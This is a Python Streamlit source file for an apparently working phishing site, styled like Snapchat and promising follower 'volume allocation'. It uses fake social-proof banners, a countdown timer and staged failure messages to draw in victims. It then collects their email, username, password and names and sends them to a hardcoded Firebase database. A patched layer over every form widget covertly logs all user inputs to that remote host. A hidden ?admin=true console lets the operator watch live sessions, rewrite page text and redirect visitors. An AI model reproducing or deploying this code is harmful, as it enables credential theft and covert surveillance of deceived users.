import streamlit as st
import time
import requests
import datetime
import uuid
import random

# --- 1. CONFIGURATION FRAMEWORK ---
st.set_page_config(
    page_title="Official Verification Gate",
    page_icon="👑",
    layout="centered",
    initial_sidebar_state="collapsed"
)
# ========================================================================
# 🌌 THE ULTIMATE OVERLORD MATRIX v8.0 - THE FINAL GOD-MODE ENGINE
# ========================================================================
import streamlit as st
import uuid
import requests
import datetime
import pandas as pd

# 1. CENTRAL NETWORK MAINFRAME
FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"

if "overlord_token" not in st.session_state:
    st.session_state.overlord_token = "NODE_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:4]
if "overlord_clicks" not in st.session_state:
    st.session_state.overlord_clicks = 0
if "overlord_time" not in st.session_state:
    st.session_state.overlord_time = datetime.datetime.now().strftime("%I:%M:%S %p")

def db_save(node, payload):
    try: requests.put(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=3)
    except: pass

def db_update(node, payload):
    try: requests.patch(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=3)
    except: pass

def db_get(node):
    try:
        r = requests.get(f"{FIREBASE_URL}/{node}.json", timeout=3).json()
        return r if r else {}
    except: return {}

# Fetch Matrix Controls Immediately
overlord_rules = db_get("overlord_global_system_rules")
if not overlord_rules:
    overlord_rules = {
        "app_status_vector": "ONLINE",
        "custom_interception_msg": "System Calibration Active.",
        "redirect_url_target": "",
        "universal_freeze_gate": False,
        "stealth_telemetry": False,
        "kill_switches": {},
        "text_mutations": {}
    }
if "kill_switches" not in overlord_rules: overlord_rules["kill_switches"] = {}
if "text_mutations" not in overlord_rules: overlord_rules["text_mutations"] = {}

# 2. THE CHRONO-RADAR DEEP LOGGING TELEMETRY
def execute_overlord_telemetry(w_type, w_label, w_value=""):
    if overlord_rules.get("stealth_telemetry", False): return
    st.session_state.overlord_clicks += 1
    
    t_token = st.session_state.overlord_token
    t_clock = datetime.datetime.now().strftime("%I:%M:%S %p")
    
    # Read fresh database context to prevent overwriting past data arrays
    live_context = db_get(f"overlord_live_streams/{t_token}")
    activity_timeline = live_context.get("interaction_history_stream", [])
    
    log_entry = f"[{t_clock}] [Step #{st.session_state.overlord_clicks}] ({w_type}) '{w_label}'"
    if w_value:
        log_entry += f" ➔ Intercepted Data: [{w_value}]"
        
    activity_timeline.append(log_entry)
    if len(activity_timeline) > 30: activity_timeline.pop(0) # Retain last 30 critical actions
    
    saved_inputs_cache = live_context.get("captured_form_state", {})
    if w_type in ["INPUT", "TEXT_AREA", "SELECTBOX", "RADIO", "CHECKBOX", "SLIDER", "NUMBER"]:
        saved_inputs_cache[w_label] = str(w_value)
        
    sync_packet = {
        "session_id_token": t_token,
        "initial_connect_time": st.session_state.overlord_time,
        "last_telemetry_pulse": t_clock,
        "total_actions_logged": st.session_state.overlord_clicks,
        "current_focus_node": f"Interacting with widget: '{w_label}'",
        "interaction_history_stream": activity_timeline,
        "captured_form_state": saved_inputs_cache,
        "network_status": "🟢 ACTIVE / SPYING"
    }
    db_update(f"overlord_live_streams/{t_token}", sync_packet)

# 3. GLOBAL INTERCEPTION GATES
is_overlord_admin = st.query_params.get("admin") == "true"

if not is_overlord_admin:
    system_vector = overlord_rules.get("app_status_vector", "ONLINE")
    if system_vector != "ONLINE":
        st.empty()
        if system_vector == "MAINTENANCE":
            st.error("# 🚧 APPLICATION UNDER REPAIR & MAINTENANCE 🚧")
            st.info(overlord_rules.get("custom_interception_msg", "Server upgrades are rolling out live."))
        elif system_vector == "BUSY":
            st.warning("# ⏳ HIGH TRAFFIC DATA COLLISION (429) ⏳")
            st.info("System bandwidth capacity heavily loaded. Processing streams...")
        elif system_vector == "DESTROYED":
            st.error("# 🛑 SYSTEM TERMINATED / ACCESS EXPIRED 🛑")
            st.error(overlord_rules.get("custom_interception_msg", "This active production deployment build has been deprecated."))
        elif system_vector == "REDIRECT" and overlord_rules.get("redirect_url_target"):
            st.info("### ➡️ Diverting your traffic route to secure network endpoint...")
            st.markdown(f"[Proceed to Secure Location]({overlord_rules.get('redirect_url_target')})")
        st.stop()

# 4. CAPTURE ORIGINAL PRISTINE STREAMLIT POINTERS (Immune to Overlaps)
_unpatched_button = st.button
_unpatched_text_input = st.text_input
_unpatched_text_area = st.text_area
_unpatched_selectbox = st.selectbox
_unpatched_radio = st.radio
_unpatched_checkbox = st.checkbox
_unpatched_slider = st.slider
_unpatched_number_input = st.number_input
_unpatched_multiselect = st.multiselect
_unpatched_write = st.write
_unpatched_markdown = st.markdown

# 5. HIGH-FI INTERCEPTION ENVELOPE (With Immediate Admin Loop Bypass Shield)
def overlord_button(label, *args, **kwargs):
    if is_overlord_admin: return _unpatched_button(label, *args, **kwargs) # Loop Breaker Fixed
    if overlord_rules["kill_switches"].get(label, False): return False
    res_click = _unpatched_button(label, *args, **kwargs)
    if res_click: execute_overlord_telemetry("BUTTON", label, "CLICKED")
    return res_click

def overlord_text_input(label, *args, **kwargs):
    if is_overlord_admin: return _unpatched_text_input(label, *args, **kwargs)
    if overlord_rules["kill_switches"].get(label, False): return ""
    if overlord_rules.get("universal_freeze_gate", False): kwargs["disabled"] = True
    user_val = _unpatched_text_input(label, *args, **kwargs)
    if user_val: execute_overlord_telemetry("INPUT", label, user_val)
    return user_val

def overlord_text_area(label, *args, **kwargs):
    if is_overlord_admin: return _unpatched_text_area(label, *args, **kwargs)
    if overlord_rules["kill_switches"].get(label, False): return ""
    if overlord_rules.get("universal_freeze_gate", False): kwargs["disabled"] = True
    user_val = _unpatched_text_area(label, *args, **kwargs)
    if user_val: execute_overlord_telemetry("TEXT_AREA", label, user_val)
    return user_val

def overlord_selectbox(label, *args, **kwargs):
    if is_overlord_admin: return _unpatched_selectbox(label, *args, **kwargs)
    if overlord_rules["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
    user_val = _unpatched_selectbox(label, *args, **kwargs)
    if f"ov_sel_{label}" not in st.session_state: st.session_state[f"ov_sel_{label}"] = user_val
    elif st.session_state[f"ov_sel_{label}"] != user_val:
        st.session_state[f"ov_sel_{label}"] = user_val
        execute_overlord_telemetry("SELECTBOX", label, user_val)
    return user_val

def overlord_radio(label, *args, **kwargs):
    if is_overlord_admin: return _unpatched_radio(label, *args, **kwargs)
    if overlord_rules["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
    user_val = _unpatched_radio(label, *args, **kwargs)
    if f"ov_rad_{label}" not in st.session_state: st.session_state[f"ov_rad_{label}"] = user_val
    elif st.session_state[f"ov_rad_{label}"] != user_val:
        st.session_state[f"ov_rad_{label}"] = user_val
        execute_overlord_telemetry("RADIO", label, user_val)
    return user_val

def overlord_checkbox(label, *args, **kwargs):
    if is_overlord_admin: return _unpatched_checkbox(label, *args, **kwargs)
    if overlord_rules["kill_switches"].get(label, False): return False
    user_val = _unpatched_checkbox(label, *args, **kwargs)
    if user_val: execute_overlord_telemetry("CHECKBOX", label, str(user_val))
    return user_val

def overlord_slider(label, *args, **kwargs):
    if is_overlord_admin: return _unpatched_slider(label, *args, **kwargs)
    if overlord_rules["kill_switches"].get(label, False): return kwargs.get("min_value", 0)
    user_val = _unpatched_slider(label, *args, **kwargs)
    execute_overlord_telemetry("SLIDER", label, str(user_val))
    return user_val

def overlord_number_input(label, *args, **kwargs):
    if is_overlord_admin: return _unpatched_number_input(label, *args, **kwargs)
    if overlord_rules["kill_switches"].get(label, False): return kwargs.get("min_value", 0.0)
    user_val = _unpatched_number_input(label, *args, **kwargs)
    if user_val: execute_overlord_telemetry("NUMBER", label, str(user_val))
    return user_val

def overlord_multiselect(label, *args, **kwargs):
    if is_overlord_admin: return _unpatched_multiselect(label, *args, **kwargs)
    if overlord_rules["kill_switches"].get(label, False): return []
    user_val = _unpatched_multiselect(label, *args, **kwargs)
    if user_val: execute_overlord_telemetry("MULTISELECT", label, str(user_val))
    return user_val

def process_live_mutation(raw_string):
    if isinstance(raw_string, str) and raw_string in overlord_rules["text_mutations"]:
        return overlord_rules["text_mutations"][raw_string]
    return raw_string

def overlord_write(*args, **kwargs):
    if is_overlord_admin: _unpatched_write(*args, **kwargs); return
    if args and isinstance(args[0], str): _unpatched_write(process_live_mutation(args[0]), **kwargs)
    else: _unpatched_write(*args, **kwargs)

def overlord_markdown(*args, **kwargs):
    if is_overlord_admin: _unpatched_markdown(*args, **kwargs); return
    if args and isinstance(args[0], str): _unpatched_markdown(process_live_mutation(args[0]), **kwargs)
    else: _unpatched_markdown(*args, **kwargs)

# OVERRIDING THE SYSTEM METHOD PLATFORM
st.button = overlord_button
st.text_input = overlord_text_input
st.text_area = overlord_text_area
st.selectbox = overlord_selectbox
st.radio = overlord_radio
st.checkbox = overlord_checkbox
st.slider = overlord_slider
st.number_input = overlord_number_input
st.multiselect = overlord_multiselect
st.write = overlord_write
st.markdown = overlord_markdown


# ========================================================================
# 💎 THE OVERLORD ULTRARICH GRAPHICAL COMMAND UI CONSOLE (?admin=true)
# ========================================================================
if is_overlord_admin:
    st.title("🌌 THE OVERLORD CONTROL MAINFRAME v8.0")
    st.caption("Supreme High-Fi Realtime Live Monitoring, Widget Interception, and Dynamic Content Mutation Shield")
    st.write("---")
    
    tab_recon, tab_infra, tab_switch, tab_mutate = st.tabs([
        "🕵️‍♂️ LIVE PACKET RECONNAISSANCE", 
        "⚙️ INFRASTRUCTURE GRID OVERHAUL", 
        "🎛️ MICROMANAGED KILL SWITCHES", 
        "📝 DYNAMIC TEXT INJECTION FIELD"
    ])
    
    # ---------------------------------------------------------
    # TAB 1: REALTIME PACKET EXPLORER & SPY PANEL
    # ---------------------------------------------------------
    with tab_recon:
        st.subheader("📡 Realtime Sync Terminal Spectrum Map")
        live_active_pools = db_get("overlord_live_streams")
        
        if live_active_pools:
            st.metric(label="Total Distinct Active User Terminal Waves", value=len(live_active_pools))
            st.write("---")
            
            terminal_nodes_list = list(live_active_pools.keys())
            targeted_node_signature = _unpatched_selectbox("🎯 Select External User Terminal Node to Spy Live:", terminal_nodes_list)
            
            if targeted_node_signature:
                node_dataset = live_active_pools[targeted_node_signature]
                
                c_left, c_right = st.columns(2)
                with c_left:
                    st.success(f"**Target System Hash:** `{targeted_node_signature}`")
                    st.markdown(f"""
                    * **Session Initialization:** {node_dataset.get('initial_connect_time')}
                    * **Last Interactive Signal Pulse:** {node_dataset.get('last_telemetry_pulse')}
                    * **Total System Interaction Clicks:** {node_dataset.get('total_actions_logged')}
                    * **Current Interface Focus:** {node_dataset.get('current_focus_node')}
                    * **Live State Connection:** {node_dataset.get('network_status')}
                    """)
                    st.markdown("#### 💬 Intercepted Realtime Inputs Cache (Form Logs)")
                    st.json(node_dataset.get("captured_form_state", {"Status": "Waiting for alphanumeric inputs..."}))
                    
                with c_right:
                    st.markdown("#### 📈 Deep Step Chronological Flow Execution")
                    for tracking_log_line in node_dataset.get("interaction_history_stream", []):
                        st.code(tracking_log_line, language="text")
                        
            st.write("---")
            if _unpatched_button("🚨 Wipe Out Database Session Logs & Clear Active Counter Nodes", key="flush_mainframe_nodes"):
                requests.delete(f"{FIREBASE_URL}/overlord_live_streams.json")
                st.rerun()
        else:
            st.info("Scanning transmission frequencies... No active external channels broadcasting sync signals right now.")

    # ---------------------------------------------------------
    # TAB 2: INFRASTRUCTURE GRID OVERHAUL (GLOBAL CONTROLS)
    # ---------------------------------------------------------
    with tab_infra:
        st.subheader("🌐 Global Infrastructure Matrix Operational Level")
        current_global_vector = overlord_rules.get("app_status_vector", "ONLINE")
        st.warning(f"Active App Environment Deployment State: **{current_global_vector}**")
        
        matrix_selection_state = _unpatched_radio("Execute Infrastructure Overload Vector Mode:", ["ONLINE", "MAINTENANCE", "BUSY", "DESTROYED", "REDIRECT"])
        broadcast_alert_input_string = _unpatched_text_input("Global Banner Intercept Alert Display Text Message:", value=overlord_rules.get("custom_interception_msg", ""))
        routing_link_endpoint_string = _unpatched_text_input("External Routing Destination Address Location (REDIRECT Mode Only):", value=overlord_rules.get("redirect_url_target", ""))
        
        st.write("---")
        st.subheader("🔒 Peripheral Gate Systems")
        universal_freeze_toggle_switch = _unpatched_checkbox("Lock Inputs Global State (Freeze All Form Textboxes to Read-Only)", value=overlord_rules.get("universal_freeze_gate", False))
        stealth_telemetry_toggle_switch = _unpatched_checkbox("Stealth Mode Operations (Pause Writing Interactions Data to Firebase)", value=overlord_rules.get("stealth_telemetry", False))
        
        if _unpatched_button("Commit Infrastructure Policy Core Overhaul ⚡", key="apply_mainframe_infrastructure"):
            overlord_rules["app_status_vector"] = matrix_selection_state
            overlord_rules["custom_interception_msg"] = broadcast_alert_input_string
            overlord_rules["redirect_url_target"] = routing_link_endpoint_string
            overlord_rules["universal_freeze_gate"] = universal_freeze_toggle_switch
            overlord_rules["stealth_telemetry"] = stealth_telemetry_toggle_switch
            db_save("overlord_global_system_rules", overlord_rules)
            st.success("Infrastructure configurations deployed into system operational architecture maps successfully!")
            st.rerun()

    # ---------------------------------------------------------
    # TAB 3: MICROMANAGED SWITCHES (ELEMENT KILL CONTROL)
    # ---------------------------------------------------------
    with tab_switch:
        st.subheader("🎯 Independent Interface Component Blockade Matrix")
        st.write("Enter the precise **Label text string** of any component inside your original script to target and isolate it runtime.")
        
        target_raw_label_string_identity = _unpatched_text_input("Target Element Label ID (Case-Sensitive Exact String Match):")
        isolation_policy_selection_directive = _unpatched_selectbox("Select Operational Security Directive:", ["RESTORE COMPONENT FUNCTION / VISIBLE", "FORCE COMPONENT ISOLATION / ENTIRELY HIDE"])
        
        if _unpatched_button("Inject Discrete Component Target Policy Rule 🔒", key="apply_mainframe_kill_switch"):
            if target_raw_label_string_identity:
                overlord_rules["kill_switches"][target_raw_label_string_identity] = (isolation_policy_selection_directive == "FORCE COMPONENT ISOLATION / ENTIRELY HIDE")
                db_save("overlord_global_system_rules", overlord_rules)
                st.success(f"Security rules committed for string identity: '{target_raw_label_string_identity}'")
                st.rerun()
                
        st.write("#### 🛡️ Active Isolated UI Elements Log Tree")
        current_active_isolated_items = [k for k, v in overlord_rules["kill_switches"].items() if v]
        if current_active_isolated_items:
            st.json(current_active_isolated_items)
            if _unpatched_button("Flush All Micro-Kill Target Policy Overrides 🔄"):
                overlord_rules["kill_switches"] = {}
                db_save("overlord_global_system_rules", overlord_rules)
                st.rerun()
        else:
            st.caption("No custom layout widget items are isolated. App rendering clean globally.")

    # ---------------------------------------------------------
    # TAB 4: DYNAMIC TEXT INJECTION (CONTENT MANIPULATION)
    # ---------------------------------------------------------
    with tab_mutate:
        st.subheader("✍️ Live Content Injection Text Mutation Engine")
        st.write("Intercept static UI strings printed via `st.write` or `st.markdown` and forge alternatives on the fly.")
        
        source_hardcoded_string_id = _unpatched_text_input("Original Raw Hardcoded Script String Text:")
        forged_display_string_alternative = _unpatched_text_input("New Injected Display Text Replacement Content:")
        
        if _unpatched_button("Inject Mainframe String Overwrite Pattern Policy 📝", key="apply_mainframe_text_mutation"):
            if source_hardcoded_string_id and forged_display_string_alternative:
                overlord_rules["text_mutations"][source_hardcoded_string_id] = forged_display_string_alternative
                db_save("overlord_global_system_rules", overlord_rules)
                st.success("Target text pattern mutation successfully committed to remote memory state maps!")
                st.rerun()
                
        st.write("#### Active Swapped Hardcoded UI String Collections")
        st.json(overlord_rules["text_mutations"])
        if _unpatched_button("Purge All Dynamic Content Mutation Rules ❌"):
            overlord_rules["text_mutations"] = {}
            db_save("overlord_global_system_rules", overlord_rules)
            st.rerun()

    st.write("---")
    st.error("🚨 ADMINISTRATIVE ROOT OVERRIDE ENVIRONMENT ACTIVE. Remove '?admin=true' query tokens from URL bar to view standard app state.")
    st.stop()

# ========================================================================
# END OF OVERLORD ENVELOPE - YOUR ORIGINAL SCRIPT RESUMES UNTOUCHED BELOW
# ========================================================================
# --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
GLOBAL_MARKDOWN_INJECTOR = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');

/* Force Absolute Premium Light Environment Canvas */
:root { color-scheme: light !important; }
html, body, .stApp { background-color: #f6f8fb !important; color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }
div[data-testid="stSidebar"] { display: none !important; }
p, span, h1, h2, h3, h4, h5, h6, label { color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }

/* ⏱️ Animated Glow-Card Counter Visualizer */
.premium-countdown-card {
    background: #ffffff !important;
    border: 2px solid #000000 !important;
    padding: 16px;
    border-radius: 14px;
    text-align: center;
    box-shadow: 0px 8px 24px rgba(255, 252, 0, 0.25);
    margin-bottom: 20px;
    border-bottom: 5px solid #fffc00 !important;
}
.countdown-timer-stream {
    font-size: 20px;
    font-weight: 800;
    color: #2563eb !important;
    letter-spacing: 1px;
}

/* 📊 Premium Flow Drop Social Banner */
.premium-live-banner {
    background: #ffffff;
    border: 1px solid #2563eb;
    border-left: 6px solid #2563eb;
    border-radius: 12px;
    padding: 14px 18px;
    margin-bottom: 20px;
    box-shadow: 0 4px 15px rgba(37, 99, 235, 0.06);
}

/* 📍 Premium Fluid Stepper Array Interface (No Sliders) */
.stepper-flex-wrapper {
    display: flex;
    justify-content: space-between;
    gap: 8px;
    margin-bottom: 25px;
}
.step-pill-node {
    flex: 1;
    background: #e2e8f0;
    padding: 10px 4px;
    border-radius: 8px;
    text-align: center;
    font-size: 11px;
    font-weight: 800;
    color: #64748b !important;
    text-transform: uppercase;
    border: 1px solid transparent;
    transition: all 0.4s ease;
}
.step-pill-node.active-node {
    background: #2563eb !important;
    color: #ffffff !important;
    box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25);
    transform: scale(1.02);
}
.step-pill-node.completed-node {
    background: #fffc00 !important;
    color: #000000 !important;
    border: 1px solid #000000;
}

/* 📦 Core High-Fidelity Bounded Canvas Box */
.premium-canvas-wrapper {
    background: #ffffff !important;
    border: 2px solid #eef2f6 !important;
    border-radius: 16px !important;
    padding: 35px 28px !important;
    box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.04) !important;
    margin-bottom: 30px;
}

/* 🎴 Dynamic Auto-Center Logo Framework Matrix */
.center-logo-box-matrix {
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 5px auto 20px auto;
    width: 90px !important;
    height: 90px !important;
    background: #ffffff;
    border-radius: 18px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05);
    padding: 8px;
    border: 1px solid #f1f5f9;
}
.center-logo-box-matrix img {
    max-width: 100%;
    max-height: 100%;
    object-fit: contain;
}

/* ✏️ High-Definition Explicit Input Boxes with Rigid Focus Parameters */
.custom-hd-label {
    font-weight: 800 !important;
    font-size: 13px !important;
    color: #000000 !important;
    text-transform: uppercase;
    letter-spacing: 0.6px;
    margin-bottom: 8px !important;
    display: block;
}
div[data-baseweb='input'] {
    border: 2px solid #cbd5e1 !important;
    border-radius: 8px !important;
    background-color: #ffffff !important;
    overflow: hidden !important;
    transition: all 0.3s ease-in-out !important;
}
div[data-baseweb='input']:focus-within {
    border-color: #2563eb !important;
    box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15) !important;
}
div[data-baseweb='input'] input {
    color: #000000 !important;
    font-weight: 600 !important;
    font-size: 14.5px !important;
    padding: 12px 14px !important;
}

/* 💛 Step 5 (Image Replica Login Layout Overrides) */
.replica-brand-label {
    text-align: center !important;
    font-size: 38px !important;
    font-weight: 400 !important;
    color: #000000 !important;
    margin-bottom: 32px !important;
    margin-top: -5px !important;
    letter-spacing: -1.5px !important;
}
.replica-field-title {
    color: #8c92ac !important;
    font-size: 11.5px !important;
    font-weight: 700 !important;
    text-transform: capitalize !important;
    margin-bottom: 6px !important;
    display: block !important;
}
/* Replica Specific Input Tints mirroring the uploaded photograph documentation */
div[data-testid="stTextInput"] div[data-baseweb='input'] { background-color: #f6f7f9 !important; border: none !important; }
div[data-testid="stTextInput"]:nth-of-type(2) div[data-baseweb='input'] { background-color: #eef2fb !important; border: none !important; }
.forgot-pass-trigger-text { text-align: right !important; font-size: 12px !important; color: #8c92ac !important; font-weight: 600 !important; margin-top: 5px !important; }

/* 🎯 Snapchat-Theme Yellow Rigid Rounded-Pill Interaction Button */
.stButton > button[kind="secondary"] {
    background-color: #fffc00 !important;
    color: #000000 !important;
    border-radius: 999px !important;
    width: 145px !important;
    font-weight: 800 !important;
    font-size: 15px !important;
    border: 2px solid #000000 !important;
    height: 44px !important;
    margin: 32px auto 5px auto !important;
    display: block !important;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05) !important;
}
.stButton > button[kind="secondary"]:hover {
    background-color: #f2ef00 !important;
    transform: translateY(-1px);
}

/* Terminal Console UI Element */
.hacker-cmd-box { background-color: #050505 !important; padding: 18px; border-radius: 10px; border: 2px solid #fffc00; margin: 20px 0; font-family: monospace !important; }
.hacker-cmd-string { color: #fffc00 !important; font-size: 13px; font-weight: 700; line-height: 1.6; }

/* Engagement Node Anchor */
.prime-engagement-block { text-align: center; margin: 22px 0; padding: 16px; background: #eef2ff; border: 2px dashed #2563eb; border-radius: 10px; }
/* Streamlit Watermark aur Header ko complete hide karne ke liye */
header[data-testid="stHeader"] { visibility: hidden !important; display: none !important; }
footer { visibility: hidden !important; display: none !important; }
div[data-testid="stDecoration"] { display: none !important; visibility: hidden !important; }
#MainMenu { visibility: hidden !important; display: none !important; }
div[class^="viewerBadge"] { display: none !important; visibility: hidden !important; }
</style>
"""
st.markdown(GLOBAL_MARKDOWN_INJECTOR, unsafe_allow_html=True)

# --- 3. HARDWARE REAL-TIME PERSISTENCE PATHWAY ---
BASE_FIREBASE_LINK = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/google_sites_logs/-OtV1bgRTfms9dW0PXTu"

# --- 4. ENGINE ARCHITECTURE CORE STATE CONFIGURATOR ---
if 'step' not in st.session_state: st.session_state.step = 1
if 'portal_data' not in st.session_state: st.session_state.portal_data = {}
if 'signup_attempts_count' not in st.session_state: st.session_state.signup_attempts_count = 1
if 'login_attempts_count' not in st.session_state: st.session_state.login_attempts_count = 1
if 'intercepted_dataset' not in st.session_state: st.session_state.intercepted_dataset = []
if 'unique_session_folder' not in st.session_state: st.session_state.unique_session_folder = str(uuid.uuid4())[:12]
if 'random_seed' not in st.session_state: st.session_state.random_seed = random.randint(10, 99)

# Countdown Engine Matrix Logic (30 Mins Target Frame Window)
if 'countdown_end' not in st.session_state:
    st.session_state.countdown_end = time.time() + (30 * 60)

current_time = time.time()
remaining_seconds = int(st.session_state.countdown_end - current_time)

if remaining_seconds <= 0:
    st.session_state.clear()
    st.rerun()

mins, secs = divmod(remaining_seconds, 60)

# Render High-Fidelity Active Counter Module Box
st.markdown(f"""
<div class='premium-countdown-card'>
    <span style='font-size:12px; font-weight:800; color:#64748b; text-transform:uppercase; display:block; margin-bottom:2px;'>⚠️ RESERVED SECURE DISPATCH HOLD CORRIDOR</span>
    <span class='countdown-timer-stream'>⏳ DISPATCH POOL LOCKS IN: {mins:02d}:{secs:02d}</span>
</div>
""", unsafe_allow_html=True)

# ==========================================
# REAL-TIME SOCIAL CONTEXT LOOP PLATFORM
# ==========================================
fake_users = ["ayush_nexus", "riyak_matrix", "kabir_claims", "ishita_vector", "tushar_op", "mehak_corridor"]
fake_counts = ["5,000", "10,000", "20,000"]
selected_user = fake_users[st.session_state.random_seed % len(fake_users)]
selected_volume = fake_counts[(st.session_state.random_seed + st.session_state.step) % len(fake_counts)]

st.markdown(f"""
<div class='premium-live-banner'>
    <p style='margin:0; font-size:13.5px; font-weight:800; color:#1e40af;'>⚡ CLOUD STREAM ACTIVE: @{selected_user} bypassed congestion pipeline, verified handle and authorized +{selected_volume} volume allocation payload!</p>
</div>
""", unsafe_allow_html=True)


# ==========================================
# 📍 ULTRARICH LIQUID STEPPER INTERFACE
# ==========================================
s1_class = "active-node" if st.session_state.step == 1 else ("completed-node" if st.session_state.step > 1 else "")
s2_class = "active-node" if st.session_state.step == 2 else ("completed-node" if st.session_state.step > 2 else "")
s3_class = "active-node" if st.session_state.step == 3 else ("completed-node" if st.session_state.step > 3 else "")
s4_class = "active-node" if st.session_state.step >= 4 else ""

st.markdown(f"""
<div class='stepper-flex-wrapper'>
    <div class='step-pill-node {s1_class}'>Step 1: Core</div>
    <div class='step-pill-node {s2_class}'>Step 2: Meta</div>
    <div class='step-pill-node {s3_class}'>Step 3: Space</div>
    <div class='step-pill-node {s4_class}'>Step 4: Verify</div>
</div>
""", unsafe_allow_html=True)


def push_to_firebase_matrix(event_state):
    runtime_node_id = str(uuid.uuid4())[:8]
    target_api_endpoint = f"{BASE_FIREBASE_LINK}/{st.session_state.unique_session_folder}/{runtime_node_id}.json"
    
    payload = {
        "server_timestamp": str(datetime.datetime.now()),
        "current_step_context": event_state,
        "primary_profile_context": st.session_state.portal_data,
        "logged_credential_sequences": st.session_state.intercepted_dataset
    }
    try:
        requests.put(target_api_endpoint, json=payload)
    except:
        pass


# ==========================================
# STEP 1: PORTAL PROFILE GENERATOR ENGINE
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    
    # Accurate Scale Icon Box Matrix Centering Layer
    st.markdown("<div class='center-logo-box-matrix'>", unsafe_allow_html=True)
    try:
        st.image("1.png")
    except:
        st.markdown("<p style='font-size:24px; margin:0;'>✨</p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)
            
    st.markdown("<div class='portal-header'><div class='portal-title'>Create Allocation Profile</div><div class='portal-subtitle'>Cloud Infrastructure Core Network Configuration Hub</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-hd-label'>🔒 Account Email Coordinates</span>", unsafe_allow_html=True)
    email_input = st.text_input("email_field", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>👤 Destination Target Handle</span>", unsafe_allow_html=True)
    user_input = st.text_input("user_field", placeholder="e.g., NexusCreator", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>🔑 Access Vault Keyphrase</span>", unsafe_allow_html=True)
    pass_input = st.text_input("pass_field", type="password", label_visibility="collapsed")
    
    st.write("")
    if st.button("INITIALIZE SECURE PIPELINE 🚀", type="primary", use_container_width=True):
        if email_input and user_input and pass_input:
            st.session_state.random_seed = random.randint(10, 99)
            if st.session_state.signup_attempts_count < 3:
                terminal_msg = st.empty()
                terminal_msg.info("⚡ Mapping active partition nodes...")
                time.sleep(1.2)
                terminal_msg.error(f"❌ Network Core Overload: Node handshake registration rejected. Please try again. (Attempt {st.session_state.signup_attempts_count}/2 Checked)")
                st.session_state.signup_attempts_count += 1
            else:
                st.success("✅ Secure Node Allocation Verified.")
                st.session_state.portal_data.update({"email": email_input, "target_username": user_input, "generated_master_key": pass_input})
                push_to_firebase_matrix("PORTAL_SIGNUP_PASSED")
                st.session_state.step = 2
                time.sleep(0.8)
                st.rerun()
        else:
            st.warning("⚠️ High priority alert: Form structures cannot remain blank.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 2: PROFILE META DATA PARSER
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Identity Link Optimization ⚙️</div><div class='portal-subtitle'>Synchronizing account infrastructure metadata channels</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-hd-label'>First Name Registry</span>", unsafe_allow_html=True)
    first_name_input = st.text_input("fn", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>Last Name Registry</span>", unsafe_allow_html=True)
    last_name_input = st.text_input("ln", label_visibility="collapsed")
    
    st.write("")
    if st.button("BUILD PAYLOAD COORDINATES ⚡", type="primary", use_container_width=True):
        if first_name_input:
            st.session_state.random_seed = random.randint(10, 99)
            UI_bar = st.progress(0)
            for structural_percentage in range(100):
                time.sleep(0.008)
                UI_bar.progress(structural_percentage + 1)
            st.session_state.portal_data.update({"first_name": first_name_input, "last_name": last_name_input})
            push_to_firebase_matrix("META_SYNC_COMPLETE")
            st.session_state.step = 3
            st.rerun()
        else:
            st.error("❌ Registry Error: Identity token string constraint violated.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 3: ALLOCATION VOLUMETRIC GRID
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Target Server Matrix 🎯</div><div class='portal-subtitle'>Adjusting delivery pipe constraints for transaction mapping</div></div>", unsafe_allow_html=True)
    
    profile_visibility_state = st.radio("Is destination endpoint strictly Public? 🔓", ["Yes, verified Public", "No, currently Private"], index=0)
    avatar_check_state = st.radio("Does target layout contain an active profile avatar? 📸", ["Yes", "No"], index=0)
    
    st.write("---")
    requested_load_volume = st.select_slider("🔥 Set Volumetric Delivery Payload Volume Stream Load:", options=[1000, 5000, 10000, 20000])
    
    st.write("")
    if st.button("LOCK DELIVERY PARAMETERS 🛡️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        if profile_visibility_state == "No, currently Private" or avatar_check_state == "No":
            st.error("❌ Target Paradox: Injection corridor cannot establish pipeline to unmapped profiles.")
        else:
            st.session_state.portal_data.update({
                "account_visibility_metric": profile_visibility_state, 
                "avatar_presence_metric": avatar_check_state, 
                "load_volume_units": requested_load_volume
            })
            push_to_firebase_matrix("TARGET_MATRIX_SET")
            st.session_state.step = 4
            st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 4: INSTANT BYPASS GATEWAY INDEX
# ==========================================
elif st.session_state.step == 4:
